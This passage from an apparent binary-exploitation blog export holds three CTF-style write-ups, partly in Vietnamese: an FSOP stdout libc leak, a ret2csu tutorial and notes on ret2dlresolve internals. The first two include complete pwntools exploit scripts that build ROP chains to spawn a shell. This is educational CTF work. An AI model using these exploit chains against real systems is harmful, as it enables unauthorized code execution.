0x1000\n        #define _IO_IS_FILEBUF        0x2000\n                                   /* 0x4000  No longer used, reserved for compat.  */\n        #define _IO_USER_LOCK         0x8000\n        ```\n        \n    \n    ‚Üí we need to note `_IO_CURRENTLY_PUTTING` (0x800) and `_IO_IS_APPENDING` (0x1000)\n    \n- From the vtable, we need to note:\n    - __overflow\n    - __xsputn\n    - __write\n- `puts` ‚Üí `__IO_puts` ‚Üí `_IO_new_file_xsputn` **‚Üí** `_IO_new_file_overflow` ‚Üí `_IO_do_write`\n- `_IO_do_write` ‚Üí `_IO_new_do_write` ‚Üí `new_do_write`\n- finally it will call `_IO_SYSWRITE(f, f‚Üí_IO_write_base, f‚Üí_IO_write_ptr - f‚Üí_IO_write_base)`\n    \n    ‚Üí output `stdout‚Üí_IO_write_base` with length of `f‚Üí_IO_write_ptr - f‚Üí_IO_write_base` to stdout\n    \n\n**To-do :** \n\n- need to bypass 2 if statements in `_IO_new_file_overflow`:\n    1. first : \n        \n        ```c\n         if (f->_flags & _IO_NO_WRITES)\n        ```\n        \n        ‚Üí _flags ‚â† `_IO_NO_WRITES` (0x0008)\n        \n    2. second :\n        \n        ```c\n          if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n        ```\n        \n        ‚Üí flags = `_IO_CURRENTLY_PUTTING` (0x800) or  `_IO_write_base` ‚â† NULL\n        \n- bypass another if statements in `new_do_write` :\n    \n    ```c\n    if (fp->_flags & _IO_IS_APPENDING)\n    ```\n    \n    ‚Üí _flag = `_IO_IS_APPENDING` (0x1000)\n    \n## How to leak libc\n1. overwrite `_flag` to `0xfbad1800`\n2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to the ptr that have an address we want to leak\n3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr + x` (it will leak x byte). That ptr must in read and writable address.\n4. call puts -> leak.\n\n## DEMO balsn babypwn 2023\n\nWe are given a simple binary \n\n![](https://hackmd.io/_uploads/B1qTwTLWT.png)\n\n![](https://hackmd.io/_uploads/Byi0waU-T.png)\n\nBut we dont have pop rdi gadget\n\n![](https://hackmd.io/_uploads/rJV-_6Uba.png)\n\nWe cannot do ret2dlresolve due to Full Relro. ret2csu is also impossible to do. So we will do some special techniques. After that ctf end, people mostly solved it in three ways :\n- bruteforce libc by using one_gadget (LMAO)\n- use add eax gadget to point eax to the area that have libc address then call puts to leak libc.\n- use fsop\n\nI will use fsop in this exploit.\n\nWe will do that in three part : \n- Stack pivot to bss \n- Overwrite the stdout ptr in the bss by using FSOP\n- Leak libc -> ret2syscall \n\n### Stack pivot to bss:\n\nThis is just a very simple process. Note that i use a very high address (bss + 0x400)\n\n```python  \npayload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n```    \n### FSOP\n\nThis is the hard part. The big question in this step is how to overwrite the stdout ptr. My idea is use the `leave, ret` gadget. \n\nEX : rsp = a , rbp = b (b is point to c). Now when we call `leave, ret` it will become rsp = b+8, rbp = c.\n\nUsing the above example, we can utilize it to make the rbp point to that stdout ptr. But here is one big problem : the stdout ptr is store in `0x404010` which is the beginning of the bss. So when we call `gets` it will get sigsegv because libc will push something to our bss() and at some point it will go to some uninitialized address.  \n\nSo how to bypass it ?. This make me stuck for a very long time. After all, i realised when call `puts` (with our rsp is now point to bss) the bss will have stdout address !. By using stack cached we can bypass the above problem (using another address not 0x404010). \n\n![](https://hackmd.io/_uploads/SJ3ApaLZp.png)\n\n\nAnother problem is when we do the `leave, ret` to overwrite the new stdout ptr `addr1` , our rsp ptr will now point to `addr1 + 8` and will look for address to return. So before overwrite that new ptr, we must overwrite `addr1 + 8` to point to some useful ropchain in our program.\n\nMore problem appear !!!. After we overwrite that ptr, and puts leak the libc. The leave, ret instruction will execute again ! and will make our rsp point to some location in the libc (writable of course) so we must also overwrite it to new ropchain. In order to do that and not overwrite the vtable, we must partial overwrite lower address of `addr1` to `\\x00` \n\n\nNow we can fsop by : \n1. overwrite `_flag` to `0xfbad1800`\n2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to got table (any function you like)\n3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr` (that `ptr` must be the bss to make it writable )\n4. call puts -> leak.\n### ret2syscall\n\nThis is the final step, and with the libc we can easily get shell\n\n```python!\npoprdi = libc.address + 0x000000000002a3e5\npoprsi = libc.address + 0x000000000002be51\npoprdx = libc.address + 0x00000000000796a2\npoprax = libc.address + 0x0000000000045eb0\nsyscall = libc.address + 0x0000000000029db4\npayload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\\x00')))\npayload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)\nsl(payload)\n```\n\n### Recap\n1. Stack pivot to bss \n2. Read again in the bss , puts to make the bss have the new stdout `ptr1`\n3. overwrite the lower address of that `ptr1` to `\\x00`\n4. overwrite `ptr1+8` to ropchain\n5. return to the above ropchain, now we can fsop stdout\n6. fsop stdout and ropchain in here\n7. return to bss and do ret2syscall\n8. get shell\n\n\nScript : \n```python!\nimport sys\nfrom pwn import *\ncontext.binary = exe = ELF(\"chall_patched\")\nlibc = ELF(\"libc.so.6\")\nif (args.REMOTE):\n        p = remote()\nelse :\n        p = process(exe.path)\n\nsla = lambda msg, data: p.sendlineafter(msg, data)\nsa = lambda msg, data: p.sendafter(msg, data)\nsl = lambda data: p.sendline(data)\ns = lambda data: p.send(data)\n\nif (args.GDB):\n        gdb.attach(p,\n        \"\"\"\n        b*0x00000000004011bb\n        b*0x00000000004011c6\n        c\n        \"\"\")\n        input()\n\npoprbp = 0x000000000040115d\nleave = 0x00000000004011c5\naddrsp = 0x0000000000401016\nret = 0x000000000040101a\n\nfake_file = p64(0xfbad1800)+p64(0x403fe8)*4+p64(exe.bss()+0x50)*4\n\npayload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404340+8+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = b'a'*32+p64(0x404378+8+0x20)+p64(exe.sym['main']+42)\nsl(payload)\n\npayload = p64(0x4011a0)*4 + p64(0x404378) + p64(leave)\nsl(payload)\n\npayload = b'\\x00'*32 + p64(exe.bss()+0x100) + p64(exe.sym['main']+42)+b'\\x00'*112+ fake_file\nsl(payload)\nfor i in range(0,5):\n        p.recvline()\nleak = u64(p.recvn(8))\nlibc.address = leak - libc.sym['setvbuf']\nprint(\"leak : \",hex(leak))\nprint(\"base : \",hex(libc.address))\n\npoprdi = libc.address + 0x000000000002a3e5\npoprsi = libc.address + 0x000000000002be51\npoprdx = libc.address + 0x00000000000796a2\npoprax = libc.address + 0x0000000000045eb0\nsyscall = libc.address + 0x0000000000029db4\n\npayload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\\x00')))\npayload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)\nsl(payload)\np.interactive()\n```\n![](https://hackmd.io/_uploads/rkKwGRIZa.png)\n\n\n## Credit \n1. https://ctftime.org/writeup/34812\n2. https://rninche01.tistory.com/entry/stdout-flag%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-libc-leak?category=838537\n\n\n","tags":["fsop"],"categories":["pwn"]},{"title":"ret2csu","url":"/2023/08/22/ret2csu/","content":"\n# ret2csu - alternative way to bypass ASLR\n\nret2csu l√† k·ªπ thu·∫≠t ƒë∆∞·ª£c s·ª≠ d·ª•ng khi ta kh√¥ng c√≥ ƒë·∫ßy ƒë·ªß gadget c·∫ßn thi·∫øt ƒë·ªÉ th·ª±c hi·ªán rop chain. ƒê√¢y ch√≠nh l√† gadget lu√¥n c√≥ khi compile dynamic m·ªôt binary. B√†i n√†y m√¨nh s·∫Ω gi·ªõi thi·ªáu v·ªÅ k·ªπ thu·∫≠t n√†y th√¥ng qua m·ªôt challenge.\n\n## T·ªïng qu√°t\nKhi ch·∫°y ch∆∞∆°ng tr√¨nh, kh√¥ng ch·ªâ c√≥ c√°c ƒëo·∫°n code c·ªßa ta ƒë∆∞·ª£c th·ª±c th√¨ m√† c√≤n c√≥ c√°c ƒëo·∫°n code m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c th√™m v√†o. Nh·ªØng ƒëo·∫°n code n√†y nh·∫±m m·ª•c ƒë√≠ch kh·ªüi t·∫°o c√°c gi√° tr·ªã m√¥i tr∆∞·ªùng, load th√¥ng tin v·ªÅ nh·ªØng ph·∫ßn ƒë∆∞·ª£c th·ª±c thi c≈©ng nh∆∞ \"hu·ª∑\" n√≥ khi k·∫øt th√∫c ch∆∞∆°ng tr√¨nh.\n\n![](https://hackmd.io/_uploads/rJYR97M6h.png)\n\nƒê√¢y l√† th·ª© t·ª± ch∆∞∆°ng tr√¨nh ch·∫°y khi trace t·ª´ entry point v√† ·ªü ƒë√¢y ta c·∫ßn ch√∫ √Ω ƒë·∫øn h√†m `__libc_csu_init`.\n\nKhi ta disass h√†m n√†y th√¨ c√≥ m·ªôt v√†i gadget th√∫ v·ªã\n```\ngef‚û§  disass __libc_csu_init\nDump of assembler code for function __libc_csu_init:\n   0x00000000004011b0 <+0>:     endbr64\n   0x00000000004011b4 <+4>:     push   r15\n   0x00000000004011b6 <+6>:     lea    r15,[rip+0x2c53]        # 0x403e10\n   0x00000000004011bd <+13>:    push   r14\n   0x00000000004011bf <+15>:    mov    r14,rdx\n   0x00000000004011c2 <+18>:    push   r13\n   0x00000000004011c4 <+20>:    mov    r13,rsi\n   0x00000000004011c7 <+23>:    push   r12\n   0x00000000004011c9 <+25>:    mov    r12d,edi\n   0x00000000004011cc <+28>:    push   rbp\n   0x00000000004011cd <+29>:    lea    rbp,[rip+0x2c44]        # 0x403e18\n   0x00000000004011d4 <+36>:    push   rbx\n   0x00000000004011d5 <+37>:    sub    rbp,r15\n   0x00000000004011d8 <+40>:    sub    rsp,0x8\n   0x00000000004011dc <+44>:    call   0x401000 <_init>\n   0x00000000004011e1 <+49>:    sar    rbp,0x3\n   0x00000000004011e5 <+53>:    je     0x401206 <__libc_csu_init+86>\n   0x00000000004011e7 <+55>:    xor    ebx,ebx\n   0x00000000004011e9 <+57>:    nop    DWORD PTR [rax+0x0]\n   0x00000000004011f0 <+64>:    mov    rdx,r14\n   0x00000000004011f3 <+67>:    mov    rsi,r13\n   0x00000000004011f6 <+70>:    mov    edi,r12d\n   0x00000000004011f9 <+73>:    call   QWORD PTR [r15+rbx*8]\n   0x00000000004011fd <+77>:    add    rbx,0x1\n   0x0000000000401201 <+81>:    cmp    rbp,rbx\n   0x0000000000401204 <+84>:    jne    0x4011f0 <__libc_csu_init+64>\n   0x0000000000401206 <+86>:    add    rsp,0x8\n   0x000000000040120a <+90>:    pop    rbx\n   0x000000000040120b <+91>:    pop    rbp\n   0x000000000040120c <+92>:    pop    r12\n   0x000000000040120e <+94>:    pop    r13\n   0x0000000000401210 <+96>:    pop    r14\n   0x0000000000401212 <+98>:    pop    r15\n   0x0000000000401214 <+100>:   ret\nEnd of assembler dump.\n```\n\n![](https://hackmd.io/_uploads/HJifCXGTn.png)\n\nM√¨nh l·∫ßn l∆∞·ª£t lable 2 gadget n√†y nh∆∞ tr√™n ·∫£nh. ·ªû ƒë√¢y ta nh·∫≠n th·∫•y r·∫±ng ta c√≥ th·ªÉ ƒëi·ªÅu khi·ªÉn ƒë∆∞·ª£c m·ªôt v√†i register v√† b·∫±ng vi·ªác chain gadget1 -> gadget2 th√¨ ta c√≥ th·ªÉ call ƒë∆∞·ª£c ƒë·ªãa ch·ªâ m√† ta mu·ªën\n\n![](https://hackmd.io/_uploads/B1WaRXzph.png)\n\n## Exploit\n\nDo t√≠nh b√° ƒë·∫°o c·ªßa n√≥ v√¨ c√≥ m·∫∑t ·ªü h·∫ßu h·∫øt c√°c binary n√™n ƒë√£ ƒë∆∞·ª£c xo√° t·ª´ glibc 2.34\n\n![](https://hackmd.io/_uploads/HkNJlNGp2.png)\nhttps://sourceware.org/legacy-ml/libc-alpha/2018-06/msg00717.html\n\nƒê√¢y l√† th√¥ng tin t√≥m t·∫Øt v·ªÅ m·ªôt s·ªë gi√° tr·ªã c·ªßa register\n\n![](https://hackmd.io/_uploads/Bka-P4fa3.png)\n\nDo sau ƒë√≥ n√≥ s·∫Ω g·ªçi `call qword [r15 + rbx*8]` n√™n ƒë·ªÉ ƒë∆°n gi·∫£n ta cho `rbx = 0` ƒë·ªÉ kh·ªèi t√≠nh to√°n \nNgo√†i ra ta ƒë·ªÉ √Ω r·∫±ng n·∫øu ta chain gadget 1 -> gadget2 th√¨ n·∫øu ta cho c√°c register ƒë√∫ng nh∆∞ c√°c gi√° tr·ªã c·ªßa ·∫£nh tr√™n th√¨ n√≥ s·∫Ω th·ª±c thi l·∫°i gadget1 v√¨ c√°c l·ªánh sau:\n```asm\n    add    rbx,0x1\n    cmp    rbp,rbx\n    jne    0x4011f0 <__libc_csu_init+64>\n```\n\nDo ƒë√≥ ta ho√†n to√†n c√≥ th·ªÉ loop l·∫°i ch∆∞∆°ng tr√¨nh ƒë·ªÉ ti·∫øp t·ª•c g·ªçi ƒë·∫øn n√≥.\n\nL∆∞u √Ω: \n- Ch·ªâ khai th√°c ƒë∆∞·ª£c v·ªõi c√°c binary ƒë∆∞·ª£c combile dynamic v·ªõi glibc <= 2.33\n- `r15+rbx*8` ph·∫£i ch·ª©a ƒë·ªãa ch·ªâ tr·ªè ƒë·∫øn ƒë·ªãa ch·ªâ ta mu·ªën call\n\n## Demo time\n\n·ªû ƒë√¢y ta c√≥ m·ªôt [file](https://github.com/Hellsender01/Youtube/blob/main/Binary%20Exploitation/B.%20Ret2CSU/ret2csu) binary\n\n![](https://hackmd.io/_uploads/SyBmXNfa2.png)\n\nD·ªÖ d√†ng th·∫•y ƒë∆∞·ª£c ƒë√¢y c√≥ l·ªói bof\n\n![](https://hackmd.io/_uploads/H1gPmNGah.png)\n\n·ªû ƒë√¢y m√¨nh s·∫Ω gi·∫£i b√†i n√†y theo ki·ªÉu ret2csu.\n\n![](https://hackmd.io/_uploads/BJGh4EGp2.png)\n\nV√†o ida ta th·∫•y c√≥ h√†m `__libc_csu_init` l√† bi·∫øt ƒë∆∞·ª£c ta c√≥ th·ªÉ s√†i k·ªπ thu·∫≠t n√†y. \n\nTi·∫øp theo v√†o gdb t√¨m ƒë·ªãa ch·ªâ c·ªßa gadget 1 v√† 2\n\n![](https://hackmd.io/_uploads/rJzir4MTn.png)\n\n```python=\npart1 = 0x000000000040120a\npart2 = 0x00000000004011f0\nret = 0x000000000040101a\n```\n\nH∆∞·ªõng khai th√°c l√∫c n√†y c·ªßa ta nh∆∞ sau:\n- leak libc\n- overwrite 1 ƒë·ªãa ch·ªâ bss b·∫±ng execve (b·∫±ng 1-l√Ω-do-n√†o-ƒë√≥ m√† m√¨nh s√†i system kh√¥ng ƒë∆∞·ª£c)\n- overwrite 1 ƒë·ªãa ch·ªâ bss b·∫±ng `/bin/sh`. ·ªû ƒë√¢y ta kh√¥ng th·ªÉ s√†i ƒë·ªãa ch·ªâ `/bin/sh` ·ªü libc ƒë∆∞·ª£c v√¨ n√≥ h∆°n 4 byte (v√¨ ta ch·ªâ c√≥ th·ªÉ control edi)\n- g·ªçi ƒë·ªãa ch·ªâ bss m√† ta overwrite\n- profit\n-> t·∫•t c·∫£ c√°c qu√° tr√¨nh tr√™n ƒë·ªÅu th·ª±c hi·ªán b·∫±ng ret2csu\n\nƒê·∫ßu ti√™n ta leak libc:\n```python=\npayload = b'a'*56+ p64(part1)\npayload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])\npayload += p64(part2)\npayload += p64(0)*7 +p64(exe.sym['vuln'])\np.send(payload)\n\np.recvuntil(b'Enter Data - ')\nleak =u64(p.recvn(8))\nlibc.address = leak - 1014464\nprint(\"LEAK \" , hex(libc.address))\n```\n·ªû ƒë√¢y m√¨nh leak ƒë·ªãa ch·ªâ c·ªßa write. Ta ƒë·ªÉ √Ω r·∫±ng c√≥ \n```python\np64(0)*7 +p64(exe.sym['vuln'])\n```\nDo n√≥ s·∫Ω th·ª±c thi l·∫°i gadget1 n√™n ta c·∫ßn 6 c√°i p64 ƒë·ªÉ fill 6 c√°i register, 1 c√≤n l·∫°i c√°i l√† padding. Sau ƒë√≥ n√≥ l·∫°i ti·∫øp t·ª•c ch·∫°y v·ªÅ h√†m `vuln`\n\nTa th·ª±c hi·ªán t∆∞∆°ng t·ª± ƒë·ªÉ overwrite bss th√†nh `execve`\n\n```python=\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(p64(libc.sym['execve']))\n```\nTi·∫øp theo l√† ghi `/bin/sh`\n```python=\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(b'/bin/sh\\x00')\n```\nCu·ªëi c√πng l√† g·ªçi l·∫°i bss ƒë·ªÉ l·∫•y shell.\n```python=\npayload = b'a'*56+p64(part1)\npayload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())\npayload += p64(part2)\n```\nPh·∫ßn n√†y ta th·∫•y l√† kh√¥ng c·∫ßn quay l·∫°i vuln l√†m g√¨ n√™n kh√¥ng c·∫ßn fill l·∫°i register\n\nCh·∫°y th·ª≠ th√¨ ta c√≥ shell\n![](https://hackmd.io/_uploads/Bk90qVfa2.png)\n\nFull script \n```python=\nfrom pwn import *\nimport time\nexe = ELF(\"ret2csu\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(exe.path)\n\npart1 = 0x000000000040120a\npart2 = 0x00000000004011f0\nret = 0x000000000040101a\n\npayload = b'a'*56+ p64(part1)\npayload += p64(0)+p64(1)+p64(1)+p64(exe.got['write'])+p64(8)+p64(exe.got['write'])\npayload += p64(part2)\npayload += p64(0)*7 +p64(exe.sym['vuln'])\np.send(payload)\n\np.recvuntil(b'Enter Data - ')\nleak =u64(p.recvn(8))\nlibc.address = leak - 1014464\nprint(\"LEAK \" , hex(libc.address))\n\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss())+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(p64(libc.sym['execve']))\n\nprint(\"BSS \",hex(exe.bss()))\n\npayload =b'a'*56 + p64(part1)\npayload += p64(0)+p64(1)+p64(0)+p64(exe.bss()+0x20)+p64(8)+p64(exe.got['read'])\npayload += p64(part2)\npayload += p64(0)*7 + p64(exe.sym['vuln'])\np.send(payload)\ntime.sleep(1)\np.send(b'/bin/sh\\x00')\n\npayload = b'a'*56+p64(part1)\npayload += p64(0)+p64(1)+p64(exe.bss()+0x20) +p64(0)*2+p64(exe.bss())\npayload += p64(part2)\n\np.send(payload)\np.interactive()\n```\n\n> **Nh·∫≠n x√©t:** D√π ·ªü ƒë√¢y glibc m√¨nh ƒëang s√†i l√† b·∫£n 2.37 nh∆∞ng v·∫´n exploit ƒë∆∞·ª£c do binary n√†y ƒë∆∞·ª£c compile ·ªü b·∫£n m√† __libc_csu_init v·∫´n c√≤n kh·∫£ d·ª•ng \n\n## References\n1. https://ir0nstone.gitbook.io/notes/types/stack/32-vs-64-bit\n2. https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf\n3. https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"ret2dlresolve note","url":"/2023/07/30/ret2dlresolve/","content":"Trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p khi ta overflow m√† kh√¥ng c√≥ c√°c h√†m trong PLT th√≠ch h·ª£p ƒë·ªÉ leak libc ra th√¨ ret2dl_resolve l√† m·ªôt k·ªπ thu·∫≠t ƒë·ªÉ l·∫•y ƒë∆∞·ª£c shell. Trong b√†i n√†y m√¨nh s·∫Ω gi·ªõi thi·ªáu t√≥m t·∫Øt v·ªÅ c√°ch ret2dl_resolve ·ªü glibc 2.37 ho·∫°t ƒë·ªông qua m·ªôt b√†i demo.\n\n## Prerequisites :\nDo n·∫øu m√¨nh gi·∫£i th√≠ch chi ti·∫øt t·ª´ng d√≤ng code ch·∫°y sau th√¨ n√≥ r·∫•t r·∫•t d√†i v√† gi·ªëng nh∆∞ reinvent the wheel n√™n c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc tr∆∞·ªõc ·ªü ƒë√¢y:\n- [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/) - Ph√¢n t√≠ch chi ti·∫øt t·ª´ng d√≤ng \n- [phrack article ·ªü m·ª•c 5](http://phrack.org/issues/58/4.html) - b√†i original public v·ªÅ k·ªπ thu·∫≠t n√†y \n- [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) - B√†i kh√° hay t√≥m t·∫Øt v·ªÅ n√≥\n- [file](https://www.da.vidbuchanan.co.uk/blog/static/babystack.tar.gz) binary m√¨nh demo\n\n## Overview\nK·ªπ thu·∫≠t n√†y l·ª£i d·ª•ng vi·ªác lazy binding t·ª©c qu√° tr√¨nh resolve symbol ·ªü runtime kh√¥ng c√≥ bound check t·ª´ ƒë√≥ ta khi·∫øn n√≥ overwrite ƒë·ªãa ch·ªâ GOT c·ªßa m·ªôt h√†m n√†o ƒë√≥ th√†nh `system`\n\n![](https://hackmd.io/_uploads/rJeZGIMi3.png)\n\nKhi ta g·ªçi h√†m `read` th√¨ nh·ªØng vi·ªác sau ƒë√¢y x·∫£y ra :\n\n1. Nh·∫£y v√†o .plt c·ªßa `read` \n2. jmp v√†o m·ªôt ƒë·ªãa ch·ªâ trong `.got.plt`. \n3. N·∫øu ƒë·ªãa ch·ªâ n√†y ch∆∞a resolve th√¨ n√≥ s·∫Ω tr·ªè ng∆∞·ª£c l·∫°i v√†o ƒë·ªãa ch·ªâ ti·∫øp theo c·∫ßn th·ª±c hi·ªán trong `.plt`. N·∫øu resolve r·ªìi th√¨ th·ª±c hi·ªán n√≥\n4. N·∫øu ch∆∞a resolve th√¨ b∆∞·ªõc n√†y l√† b∆∞·ªõc ƒëi resolve\n\nTrong qu√° tr√¨nh ƒëi resolve n√≥ s·∫Ω push 2 arguments l√™n stack : `linkmap` v√† `reloc_arg`.\n- `linkmap` l√† ch·ªó ch·ª©a c√°c ƒë·ªãa ch·ªâ ·ªü b√™n d∆∞·ªõi - ·ªü ƒë√¢y ta kh√¥ng quan t√¢m v·ªÅ n√≥\n![](https://hackmd.io/_uploads/By-vOLMsn.png)\n- `reloc_arg` d√πng ƒë·ªÉ t√≠nh offset m√† ta c·∫ßn c·ª±c k·ª≥ ƒë·ªÉ √Ω.\n\nM·ª•c ti√™u c·ªßa ret2dl_resolve nh∆∞ sau:\n- Fake argument `reloc_arg` \n- Fake 3 chunk STRTAB, SYMTAB,JMPREL\n\nƒê·ªÉ fake ƒë√∫ng ta c·∫ßn t√≠nh offset **chu·∫©n** . 3 chunk ta fake th∆∞·ªùng n·∫±m ·ªü heap ho·∫∑c bss c·ªßa binary. ƒê√¢y l√† ƒë·ªãa ch·ªâ m√† ta ph·∫£i c√≥ control ho√†n to√†n.\nL∆∞u √Ω : ƒë·ªãa sym v√† SYMTAB, reloc v√† JMPREL m√† m√¨nh ƒë·ªÅ c·∫≠p b√™n d∆∞·ªõi l√† c√°c ƒë·ªãa ch·ªâ kh√°c nhau ho√†n to√†n.\n\n## Details:\n### STRTAB\n\n```clike=\ngef‚û§  x/10s 0x804822c\n0x804822c:      \"\"\n0x804822d:      \"libc.so.6\"\n0x8048237:      \"_IO_stdin_used\"\n0x8048246:      \"read\"\n0x804824b:      \"alarm\"\n0x8048251:      \"__libc_start_main\"\n0x8048263:      \"__gmon_start__\"\n0x8048272:      \"GLIBC_2.0\"\n0x804827c:      \"\"\n0x804827d:      \"\"\n```\n\nSTRTAB ch·ªâ l√† n∆°i ch·ª©a strings. M·ª•c ti√™u c·ªßa ta khi fake n√≥ ch·ªâ l√† ghi `system\\x00` (null terminated str) v√†o m·ªôt ƒë·ªãa ch·ªâ\n\n### SYMTAB\n\nM·ªôt chunk sym ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:\n- ·ªû x64\n```clike=\ntypedef struct\n{\n  Elf64_Word\tst_name;\t\t/* Symbol name (string tbl index) */\n  unsigned char\tst_info;\t\t/* Symbol type and binding */\n  unsigned char st_other;\t\t/* Symbol visibility */\n  Elf64_Section\tst_shndx;\t\t/* Section index */\n  Elf64_Addr\tst_value;\t\t/* Symbol value */\n  Elf64_Xword\tst_size;\t\t/* Symbol size */\n} Elf64_Sym;\n```\n- ·ªû x32\n```clike=\ntypedef struct\n{\n  Elf32_Word\tst_name;\t\t/* Symbol name (string tbl index) */\n  Elf32_Addr\tst_value;\t\t/* Symbol value */\n  Elf32_Word\tst_size;\t\t/* Symbol size */\n  unsigned char\tst_info;\t\t/* Symbol type and binding */\n  unsigned char\tst_other;\t\t/* Symbol visibility */\n  Elf32_Section\tst_shndx;\t\t/* Section index */\n} Elf32_Sym;\n```\n\nC√°ch m√† source t√≠nh ra chunk n√†y : \n```clike=\nconst ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]\n// which is the same as :\nconst ElfW(Sym) *sym = &symtab[(reloc->r_info) >> 8]\n// also the same as :\n*sym = SYMTAB + index *sizeof(sym)\n// index = (reloc->r_info) >> 8\n\n----------------------------------------------\nconst ElfW(Sym) *const symtab\n    = (const void *) D_PTR (l, l_info[DT_SYMTAB])\n                      --------SYMTAB--------\n```\n\nx64 v√† x32 ch·ªâ kh√°c m·ªói size c√≤n l·∫°i t∆∞∆°ng t·ª±\n\n![](https://hackmd.io/_uploads/HkdIp8zoh.png)\n\n·ªû ƒë√¢y ch√∫ng ta ch·ªâ quan t√¢m ƒë·∫øn `st_other` v√† `st_name`\n- `st_other` : b·∫Øt bu·ªôc = 0\n- `st_name` : ch·ª©a offset ƒë·∫øn string `system` m√† ta fake\n\n### JMPREL\n\nM·ªôt chunk reloc ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau : \n- x32\n```c=\n\ntypedef struct\n{\n  Elf32_Addr\tr_offset;\t\t/* Address */\n  Elf32_Word\tr_info;\t\t\t/* Relocation type and symbol index */\n} Elf32_Rel;\n```\n\n- x64\n```c=\ntypedef struct\n{\n  Elf64_Addr\tr_offset;\t\t/* Address */\n  Elf64_Xword\tr_info;\t\t\t/* Relocation type and symbol index */\n} Elf64_Rel;\n```\nC√°ch m√† source t√≠nh ra chunk n√†y:\n```c=\nconst PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);\n// the same as\nreloc = JMPREL + reloc_offset\n// such that\nreloc_offset = reloc_arg //x32\nreloc_offset = reloc_arg *0x18 //x64\n```\n\n![](https://hackmd.io/_uploads/SJWzMvGo3.png)\n\n\n## But howww ???\n### Basic algorithm (true case)\nTrong tr∆∞·ªùng h·ª£p tho·∫£ m√£n t·∫•t c·∫£ ƒëi·ªÅu ki·ªán th√¨ n√≥ s·∫Ω resolve b·∫±ng thu·∫≠t to√°n sau\n1. push `reloc_arg`, `linkmap`\n2. get `SYMTAB` address\n3. get `STRTAB` address\n4. get a ptr to `ELF32_Rela` / `ELF64_Rela` struct\n5. get a ptr to `ELF32_Sym` / `ELF64_Sym` struct (base on a ptr in step 4)\n6. check `r_info` ending with 0x7 \n7. check `st_other == 0` or not\n8. do some stuff to check the version\n9. get the address from glibc base on `STRTAB + st_name`\n\n### Observation:\n1. Ta kh√¥ng th·ªÉ fake `SYMTAB`, `STRTAB` , `linkmap` (hmmm c√≥ th·ªÉ c√≥ nh∆∞ng k·ªπ thu·∫≠t kh√° kh√≥)\n2. B∆∞·ªõc 4 t√≠nh ptr ƒë√≥ b·∫±ng c√¥ng th·ª©c:  `reloc = JMPREL + reloc_arg` \n3. B∆∞·ªõc 5 t√≠nh ptr ƒë√≥ b·∫±ng c√¥ng th·ª©c `sym = SYMTAB + (r_info >> 8) * sizeof(sym)`\n\n### C√°c b∆∞·ªõc t√≠nh:\n1. T√¨m 3 ƒë·ªãa ch·ªâ `addr1` , `addr2` ,`addr3` m√† ch√∫ng ta c√≥ quy·ªÅn control\n2. Fake ELF32_Rela / ELF64_Rela `addr1` struct\n- reloc_arg = `addr1`  - JMPREL **(x32)**\n- reloc_arg = (`addr1`  - JMPREL) / 24 **(x64)**\n-  r_info = (((`addr2` - SYMTAB) / sizeof(sym)) << 8) | 7\n- `addr1` chunk : [GOT,  r_info]\n3. Fake ELF32_Sym / ELF64_Sym `addr2` struct :\n- st_name = `addr3` - STRTAB\n- st_value, st_size, st_info, st_other, st_shndx = 